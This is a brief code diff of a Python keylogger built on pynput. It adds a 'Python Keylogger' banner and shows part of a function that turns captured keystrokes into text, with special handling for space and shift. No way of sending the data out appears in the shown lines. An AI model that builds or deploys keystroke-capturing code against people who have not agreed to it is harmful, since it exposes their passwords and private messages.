@@ -2,9 +2,9 @@
 # pip install pynput
 from pynput.keyboard import Listener
 
+print("Python Keylogger\n")
 def log_keystroke(key):
     key = str(key).replace("'", "")
-
     if key == 'Key.space':
         key = ' '
     if key == 'Key.shift_r':
